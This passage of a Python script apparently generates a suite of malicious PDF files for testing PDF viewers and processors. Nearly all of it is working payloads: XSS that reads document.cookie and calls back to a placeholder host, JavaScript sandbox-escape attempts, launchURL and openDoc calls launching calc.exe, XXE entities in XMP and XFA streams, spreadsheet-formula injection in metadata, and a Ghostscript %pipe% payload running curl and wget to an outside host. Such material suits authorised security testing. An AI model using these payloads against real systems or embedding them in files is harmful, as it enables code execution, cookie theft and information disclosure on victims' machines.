/V (\\">'></div><details/open/ontoggle=confirm(document.cookie);fetch('{base_url}/xss7');></details>)
>>
endobj
xref
0 5
trailer
<<
/Size 5
/Root 1 0 R
>>
startxref
0
%%EOF'''
    with open(xss_dir / "xss7_annotation_v.pdf", 'wb') as f:
        f.write(pdf_xss7_annotation_v.encode())
    
    pdf_xss8_fontmatrix = f'''%PDF-1.4
1 0 obj
<<
/Type /Catalog
/Pages 2 0 R
>>
endobj
2 0 obj
<<
/Type /Pages
/Kids [3 0 R]
/Count 1
>>
endobj
3 0 obj
<<
/Type /Page
/Parent 2 0 R
/MediaBox [0 0 612 792]
/Resources <<
/Font <<
/F1 5 0 R
>>
>>
/Contents 6 0 R
>>
endobj
4 0 obj
<<
/Type /FontDescriptor
/FontName /SNCSTG+CMBX12
>>
endobj
5 0 obj
<<
/BaseFont /SNCSTG+CMBX12
/FontDescriptor 4 0 R
/FontMatrix [ 1 2 3 4 5 (1\\); alert\\('origin: '+window.origin+', pdf url: '+\\\\(window.PDFViewerApplication?window.PDFViewerApplication.url:document.URL\\);fetch('{base_url}/xss8');) ]
/Subtype /Type1
/Type /Font
>>
endobj
6 0 obj
<<
/Length 0
>>
stream
endstream
endobj
xref
0 7
trailer
<<
/Size 7
/Root 1 0 R
>>
startxref
0
%%EOF'''
    with open(xss_dir / "xss8_fontmatrix.pdf", 'wb') as f:
        f.write(pdf_xss8_fontmatrix.encode())
    
    pdf_xss9_js_sandbox_bypass_apryse = f'''%PDF-1.4
1 0 obj
<<
/Type /Catalog
/Pages 2 0 R
/Names <<
/JavaScript <<
/Names [(test) 3 0 R]
>>
>>
>>
endobj
2 0 obj
<<
/Type /Pages
/Kids [4 0 R]
/Count 1
>>
endobj
3 0 obj
<<
/S /JavaScript
/JS (app.alert\\(1\\); console.println\\(delete window\\); console.println\\(delete confirm\\); console.println\\(delete document\\); window.confirm\\(document.cookie\\);fetch('{base_url}/xss9');)
>>
endobj
4 0 obj
<<
/Type /Page
/Parent 2 0 R
/MediaBox [0 0 612 792]
>>
endobj
xref
0 5
trailer
<<
/Size 5
/Root 1 0 R
>>
startxref
0
%%EOF'''
    with open(xss_dir / "xss9_js_sandbox_bypass_apryse.pdf", 'wb') as f:
        f.write(pdf_xss9_js_sandbox_bypass_apryse.encode())
    
    pdf_xss10_data_uri_simple = f'''%PDF-1.4
1 0 obj
<<
/Type /Catalog
/Pages 2 0 R
>>
endobj
2 0 obj
<<
/Type /Pages
/Kids [3 0 R]
/Count 1
>>
endobj
3 0 obj
<<
/Type /Page
/Parent 2 0 R
/MediaBox [0 0 612 792]
/Annots [4 0 R]
>>
endobj
4 0 obj
<<
/Type /Annot
/Subtype /Link
/Rect [100 100 200 200]
/A <<
/S /URI
/URI (data:text/html,<script>alert(1)</script>)
>>
>>
endobj
xref
0 5
trailer
<<
/Size 5
/Root 1 0 R
>>
startxref
0
%%EOF'''
    with open(xss_dir / "xss10_data_uri_simple.pdf", 'wb') as f:
        f.write(pdf_xss10_data_uri_simple.encode())
    
    pdf_xss11_uri_javascript_simple = f'''%PDF-1.4
1 0 obj
<<
/Type /Catalog
/Pages 2 0 R
>>
endobj
2 0 obj
<<
/Type /Pages
/Kids [3 0 R]
/Count 1
>>
endobj
3 0 obj
<<
/Type /Page
/Parent 2 0 R
/MediaBox [0 0 612 792]
/Annots [4 0 R]
>>
endobj
4 0 obj
<<
/Type /Annot
/Subtype /Link
/Rect [100 100 200 200]
/A <<
/S /URI
/URI (javascript:alert(1))
>>
>>
endobj
xref
0 5
trailer
<<
/Size 5
/Root 1 0 R
>>
startxref
0
%%EOF'''
    with open(xss_dir / "xss11_uri_javascript_simple.pdf", 'wb') as f:
        f.write(pdf_xss11_uri_javascript_simple.encode())
    
    pdf_xss12_js_simple = f'''%PDF-1.4
1 0 obj
<<
/Type /Catalog
/Pages 2 0 R
/Names <<
/JavaScript <<
/Names [(test) 3 0 R]
>>
>>
>>
endobj
2 0 obj
<<
/Type /Pages
/Kids [4 0 R]
/Count 1
>>
endobj
3 0 obj
<<
/S /JavaScript
/JS (app.alert(1);)
>>
endobj
4 0 obj
<<
/Type /Page
/Parent 2 0 R
/MediaBox [0 0 612 792]
>>
endobj
xref
0 5
trailer
<<
/Size 5
/Root 1 0 R
>>
startxref
0
%%EOF'''
    with open(xss_dir / "xss12_js_simple.pdf", 'wb') as f:
        f.write(pdf_xss12_js_simple.encode())
    
    pdf_info1_cell_filename = f'''%PDF-1.4
1 0 obj
<<
/Type /Catalog
/Pages 2 0 R
/Info 3 0 R
>>
endobj
2 0 obj
<<
/Type /Pages
/Kids [4 0 R]
/Count 1
>>
endobj
3 0 obj
<<
/Title (Info Disclosure: CELL filename)
/Author (=CELL("filename"))
/Subject (=CELL("filename"))
/Keywords (=CELL("filename"))
/Creator (=CELL("filename"))
/Producer (=CELL("filename"))
/CreationDate (D:20240101000000Z)
/ModDate (D:20240101000000Z)
>>
endobj
4 0 obj
<<
/Type /Page
/Parent 2 0 R
/MediaBox [0 0 612 792]
>>
endobj
xref
0 5
trailer
<<
/Size 5
/Root 1 0 R
/Info 3 0 R
>>
startxref
0
%%EOF'''
    with open(info_dir / "info1_cell_filename.pdf", 'wb') as f:
        f.write(pdf_info1_cell_filename.encode())
    
    pdf_info2_info_version = f'''%PDF-1.4
1 0 obj
<<
/Type /Catalog
/Pages 2 0 R
/Info 3 0 R
>>
endobj
2 0 obj
<<
/Type /Pages
/Kids [4 0 R]
/Count 1
>>
endobj
3 0 obj
<<
/Title (Info Disclosure: INFO version)
/Author (=INFO("version"))
/Subject (=INFO("version"))
/Keywords (=INFO("version"))
/Creator (=INFO("version"))
/Producer (=INFO("version"))
/CreationDate (D:20240101000000Z)
/ModDate (D:20240101000000Z)
>>
endobj
4 0 obj
<<
/Type /Page
/Parent 2 0 R
/MediaBox [0 0 612 792]
>>
endobj
xref
0 5
trailer
<<
/Size 5
/Root 1 0 R
/Info 3 0 R
>>
startxref
0
%%EOF'''
    with open(info_dir / "info2_info_version.pdf", 'wb') as f:
        f.write(pdf_info2_info_version.encode())
    
    pdf_info3_info_system = f'''%PDF-1.4
1 0 obj
<<
/Type /Catalog
/Pages 2 0 R
/Info 3 0 R
>>
endobj
2 0 obj
<<
/Type /Pages
/Kids [4 0 R]
/Count 1
>>
endobj
3 0 obj
<<
/Title (Info Disclosure: INFO system)
/Author (=INFO("system"))
/Subject (=INFO("system"))
/Keywords (=INFO("system"))
/Creator (=INFO("system"))
/Producer (=INFO("system"))
/CreationDate (D:20240101000000Z)
/ModDate (D:20240101000000Z)
>>
endobj
4 0 obj
<<
/Type /Page
/Parent 2 0 R
/MediaBox [0 0 612 792]
>>
endobj
xref
0 5
trailer
<<
/Size 5
/Root 1 0 R
/Info 3 0 R
>>
startxref
0
%%EOF'''
    with open(info_dir / "info3_info_system.pdf", 'wb') as f:
        f.write(pdf_info3_info_system.encode())
    
    pdf_info4_now = f'''%PDF-1.4
1 0 obj
<<
/Type /Catalog
/Pages 2 0 R
/Info 3 0 R
>>
endobj
2 0 obj
<<
/Type /Pages
/Kids [4 0 R]
/Count 1
>>
endobj
3 0 obj
<<
/Title (Info Disclosure: NOW)
/Author (=NOW())
/Subject (=NOW())
/Keywords (=NOW())
/Creator (=NOW())
/Producer (=NOW())
/CreationDate (D:20240101000000Z)
/ModDate (D:20240101000000Z)
>>
endobj
4 0 obj
<<
/Type /Page
/Parent 2 0 R
/MediaBox [0 0 612 792]
>>
endobj
xref
0 5
trailer
<<
/Size 5
/Root 1 0 R
/Info 3 0 R
>>
startxref
0
%%EOF'''
    with open(info_dir / "info4_now.pdf", 'wb') as f:
        f.write(pdf_info4_now.encode())
    
    pdf_info5_info_directory = f'''%PDF-1.4
1 0 obj
<<
/Type /Catalog
/Pages 2 0 R
/Info 3 0 R
>>
endobj
2 0 obj
<<
/Type /Pages
/Kids [4 0 R]
/Count 1
>>
endobj
3 0 obj
<<
/Title (Info Disclosure: INFO directory)
/Author (=INFO("directory"))
/Subject (=INFO("directory"))
/Keywords (=INFO("directory"))
/Creator (=INFO("directory"))
/Producer (=INFO("directory"))
/CreationDate (D:20240101000000Z)
/ModDate (D:20240101000000Z)
>>
endobj
4 0 obj
<<
/Type /Page
/Parent 2 0 R
/MediaBox [0 0 612 792]
>>
endobj
xref
0 5
trailer
<<
/Size 5
/Root 1 0 R
/Info 3 0 R
>>
startxref
0
%%EOF'''
    with open(info_dir / "info5_info_directory.pdf", 'wb') as f:
        f.write(pdf_info5_info_directory.encode())
    
    pdf_rce3_openDoc = f'''%PDF-1.4
1 0 obj
<<
/Type /Catalog
/Pages 2 0 R
/Names <<
/JavaScript <<
/Names [(test) 3 0 R]
>>
>>
>>
endobj
2 0 obj
<<
/Type /Pages
/Kids [4 0 R]
/Count 1
>>
endobj
3 0 obj
<<
/S /JavaScript
/JS (app.alert\\(1\\); app.openDoc("/C/Windows/System32/calc.exe");)
>>
endobj
4 0 obj
<<
/Type /Page
/Parent 2 0 R
/MediaBox [0 0 612 792]
>>
endobj
xref
0 5
trailer
<<
/Size 5
/Root 1 0 R
>>
startxref
0
%%EOF'''
    with open(rce_dir / "rce3_openDoc.pdf", 'wb') as f:
        f.write(pdf_rce3_openDoc.encode())
    
    pdf_rce4_uri_start = f'''%PDF-1.4
1 0 obj
<<
/Type /Catalog
/Pages 2 0 R
>>
endobj
2 0 obj
<<
/Type /Pages
/Kids [3 0 R]
/Count 1
>>
endobj
3 0 obj
<<
/Type /Page
/Parent 2 0 R
/MediaBox [0 0 612 792]
/Annots [4 0 R]
>>
endobj
4 0 obj
<<
/Type /Annot
/Subtype /Link
/Rect [100 100 200 200]
/A <<
/S /URI
/URI (START C:/\\Windows/\\system32/\\calc.exe)
>>
>>
endobj
xref
0 5
trailer
<<
/Size 5
/Root 1 0 R
>>
startxref
0
%%EOF'''
    with open(rce_dir / "rce4_uri_start.pdf", 'wb') as f:
        f.write(pdf_rce4_uri_start.encode())
    
    pdf_rce5_launchURL = f'''%PDF-1.4
1 0 obj
<<
/Type /Catalog
/Pages 2 0 R
/Names <<
/JavaScript <<
/Names [(test) 3 0 R]
>>
>>
>>
endobj
2 0 obj
<<
/Type /Pages
/Kids [4 0 R]
/Count 1
>>
endobj
3 0 obj
<<
/S /JavaScript
/JS (app.alert\\(1\\); app.launchURL\\("START C:/\\Windows/\\system32/\\calc.exe", true\\); app.launchURL\\("javascript:confirm\\(3\\);", true\\);)
>>
endobj
4 0 obj
<<
/Type /Page
/Parent 2 0 R
/MediaBox [0 0 612 792]
>>
endobj
xref
0 5
trailer
<<
/Size 5
/Root 1 0 R
>>
startxref
0
%%EOF'''
    with open(rce_dir / "rce5_launchURL.pdf", 'wb') as f:
        f.write(pdf_rce5_launchURL.encode())
    
    pdf_rce6_launchURL_file = f'''%PDF-1.4
1 0 obj
<<
/Type /Catalog
/Pages 2 0 R
/Names <<
/JavaScript <<
/Names [(test) 3 0 R]
>>
>>
>>
endobj
2 0 obj
<<
/Type /Pages
/Kids [4 0 R]
/Count 1
>>
endobj
3 0 obj
<<
/S /JavaScript
/JS (app.alert\\(1\\); app.launchURL\\("/C/Windows/system32/calc.exe", true\\); app.launchURL\\("'><details open ontoggle=confirm\\(3\\);", true\\);)
>>
endobj
4 0 obj
<<
/Type /Page
/Parent 2 0 R
/MediaBox [0 0 612 792]
>>
endobj
xref
0 5
trailer
<<
/Size 5
/Root 1 0 R
>>
startxref
0
%%EOF'''
    with open(rce_dir / "rce6_launchURL_file.pdf", 'wb') as f:
        f.write(pdf_rce6_launchURL_file.encode())
    
    pdf_lfi2_uri_file = f'''%PDF-1.4
1 0 obj
<<
/Type /Catalog
/Pages 2 0 R
>>
endobj
2 0 obj
<<
/Type /Pages
/Kids [3 0 R]
/Count 1
>>
endobj
3 0 obj
<<
/Type /Page
/Parent 2 0 R
/MediaBox [0 0 612 792]
/Annots [4 0 R]
>>
endobj
4 0 obj
<<
/Type /Annot
/Subtype /Link
/Rect [100 100 200 200]
/A <<
/S /URI
/URI (file:///C:/Windows/system32/calc.exe)
>>
>>
endobj
xref
0 5
trailer
<<
/Size 5
/Root 1 0 R
>>
startxref
0
%%EOF'''
    with open(lfi_dir / "lfi2_uri_file.pdf", 'wb') as f:
        f.write(pdf_lfi2_uri_file.encode())
    
    pdf_master = f'''%PDF-1.4
1 0 obj
<<
/Type /Catalog
/Pages 2 0 R
/Metadata 3 0 R
/OpenAction <<
/S /JavaScript
/JS (var x=new XMLHttpRequest();x.onload=(()=>app.alert(this.responseText));x.open('GET','{base_url}/xhr');x.send();fetch('{base_url}/fetch').then(async r=>app.alert(await r.text()));)
>>
/Names <<
/JavaScript <<
/Names [(test) 6 0 R (iframe) 15 0 R (xhr) 16 0 R (fetch) 17 0 R (xss1) 18 0 R (xss5) 19 0 R (xss9) 20 0 R]
>>
/EmbeddedFiles <<
/Names [(evil.zip) 7 0 R]
>>
>>
/AcroForm <<
/XFA 8 0 R
>>
>>
endobj
2 0 obj
<<
/Type /Pages
/Kids [9 0 R]
/Count 1
>>
endobj
3 0 obj
<<
/Type /Metadata
/Subtype /XML
/Length 400
>>
stream
<?xpacket begin="\ufeff" id="W5M0MpCehiHzreSzNTczkc9d"?>
<!DOCTYPE x [<!ENTITY % x SYSTEM "{base_url}/xxe-xmp">%x;]>
<x:xmpmeta xmlns:x="adobe:ns:meta/">
<rdf:RDF xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#">
<rdf:Description rdf:about="" xmlns:xmpMM="http://ns.adobe.com/xap/1.0/mm/">
<xmpMM:DocumentID>{base_url}/xmp</xmpMM:DocumentID>
</rdf:Description>
</rdf:RDF>
</x:xmpmeta>
<?xpacket end="w"?>
endstream
endobj
4 0 obj
<<
/Type /XObject
/Subtype /Image
/Width 100
/Height 100
/ColorSpace /DeviceRGB
/BitsPerComponent 8
/URI ({base_url}/img1)
>>
stream
endstream
endobj
5 0 obj
<<
/Type /Font
/Subtype /Type1
/BaseFont /Helvetica
/FontFile2 <<
/URI ({base_url}/font.ttf)
>>
>>
endobj
6 0 obj
<<
/S /JavaScript
/JS (this.importDataObject("pwn","{base_url}/file");)
>>
endobj
7 0 obj
<<
/Type /FileSpec
/F (evil.zip)
/EF <<
/F 10 0 R
>>
>>
endobj
8 0 obj
<<
/Length 300
>>
stream
<?xml version="1.0"?>
<!DOCTYPE x [<!ENTITY % x SYSTEM "{base_url}/xfa-xxe">%x;]>
<xdp:xdp xmlns:xdp="http://ns.adobe.com/xdp/">
<template>
<image href="{base_url}/xfa-img"/>
<field name="test">Test</field>
</template>
</xdp:xdp>
endstream
endobj
9 0 obj
<<
/Type /Page
/Parent 2 0 R
/MediaBox [0 0 612 792]
/Resources <<
/XObject <<
/Img1 4 0 R
>>
/Font <<
/F1 5 0 R
/F2 24 0 R
>>
/ColorSpace <<
/CS1 11 0 R
>>
>>
/Annots [12 0 R 13 0 R 21 0 R 22 0 R 23 0 R]
/Contents 14 0 R
>>
endobj
10 0 obj
<<
/Type /EmbeddedFile
/Length 0
/F <<
/URI ({base_url}/evil.zip)
>>
>>
endobj
11 0 obj
<<
/N 3
/Alternate /DeviceRGB
/Filter /FlateDecode
/Length 0
/URI ({base_url}/evil.icc)
>>
endobj
12 0 obj
<<
/Type /Annot
/Subtype /Link
/Rect [100 100 200 200]
/A <<
/S /URI
/URI ({base_url}/link1)
>>
>>
endobj
13 0 obj
<<
/Type /Annot
/Subtype /Link
/Rect [300 300 400 400]
/A <<
/S /GoToR
/F ({base_url}/remote.pdf)
/D [0 /Fit]
>>
>>
endobj
14 0 obj
<<
/Length 0
>>
stream
endstream
endobj
15 0 obj
<<
/S /JavaScript
/JS (app.alert("Loading iframe"); var html = '<iframe src="{base_url}/iframe"></iframe>'; this.getField("test").value = html;)
>>
endobj
16 0 obj
<<
/S /JavaScript
/JS (var x=new XMLHttpRequest();x.onload=(()=>app.alert(this.responseText));x.open('GET','{base_url}/xhr');x.send();)
>>
endobj
17 0 obj
<<
/S /JavaScript
/JS (fetch('{base_url}/fetch').then(async r=>app.alert(await r.text()));)
>>
endobj
18 0 obj
<<
/S /JavaScript
/JS (app.alert\\(1\\); Object.getPrototypeOf(function*(){{}}).constructor = null; ((function*(){{}}).constructor("document.write('<script>confirm(document.cookie);</script><iframe src={base_url}/xss1>');"))().next();)
>>
endobj
19 0 obj
<<
/S /JavaScript
/JS (app.alert\\(1\\); confirm\\(2\\); prompt\\(document.cookie\\); document.write\\("<iframe src='{base_url}/xss5'>"\\);)
>>
endobj
20 0 obj
<<
/S /JavaScript
/JS (app.alert\\(1\\); console.println\\(delete window\\); console.println\\(delete confirm\\); console.println\\(delete document\\); window.confirm\\(document.cookie\\);fetch('{base_url}/xss9');)
>>
endobj
21 0 obj
<<
/Type /Annot
/Subtype /Link
/Rect [200 200 300 300]
/A <<
/S /URI
/URI (data:text/html,<script>alert\\(2\\);fetch('{base_url}/xss2');</script>)
>>
>>
endobj
22 0 obj
<<
/Type /Annot
/Subtype /Link
/Rect [400 400 500 500]
/A <<
/S /URI
/URI (javascript:confirm\\(2\\);fetch('{base_url}/xss6');)
>>
>>
endobj
23 0 obj
<<
/Type /Annot
/Rect [284.7745656638 581.6814031126 308.7745656638 605.6814031126]
/Subtype /Text
/M (D:20210402013803+02'00)
/C [1 1 0]
/T (\\">'><details open ontoggle=confirm\\(3\\);fetch('{base_url}/xss3');>)
/P 9 0 R
/Contents (\\">'><details open ontoggle=confirm('XSS');>)
>>
endobj
24 0 obj
<<
/BaseFont /SNCSTG+CMBX12
/FontDescriptor 25 0 R
/FontMatrix [ 1 2 3 4 5 (1\\); alert\\('origin: '+window.origin+', pdf url: '+\\\\(window.PDFViewerApplication?window.PDFViewerApplication.url:document.URL\\);fetch('{base_url}/xss8');) ]
/Subtype /Type1
/Type /Font
>>
endobj
25 0 obj
<<
/Type /FontDescriptor
/FontName /SNCSTG+CMBX12
>>
endobj
xref
0 26
trailer
<<
/Size 26
/Root 1 0 R
>>
startxref
0
%%EOF'''
    with open(output_dir / "master.pdf", 'wb') as f:
        f.write(pdf_master.encode())
    
    pdf_master2_rce = f'''%PDF-1.4
1 0 obj
<<
/Type /Catalog
/Pages 2 0 R
>>
endobj
2 0 obj
<<
/Type /Pages
/Kids [3 0 R]
/Count 1
>>
endobj
3 0 obj
<<
/Type /Page
/Parent 2 0 R
/MediaBox [0 0 612 792]
/Contents 4 0 R
>>
endobj
4 0 obj
<<
/Length 300
/Filter /FlateDecode
>>
stream
%!PS-Adobe-3.0
userdict /setpagedevice undef
save
legal
{{
    null restore
    stopped {{
        pop
    }} if
    (legal)
}} stopped
{{
    (legal\\) {{
        pop
        legal
    }} stopped
    {{
        restore
    }} ifelse
}} ifelse
mark /OutputFile (%pipe%curl {base_url}/rce-ghostscript) currentdevice putdeviceprops
mark /OutputFile (%pipe%wget {base_url}/rce-postscript) currentdevice putdeviceprops
endstream
endobj
xref
0 5
trailer
<<
/Size 5
/Root 1 0 R
>>
startxref
0
%%EOF'''
    with open(output_dir / "master2_rce.pdf", 'wb') as f:
        f.write(pdf_master2_rce.encode())
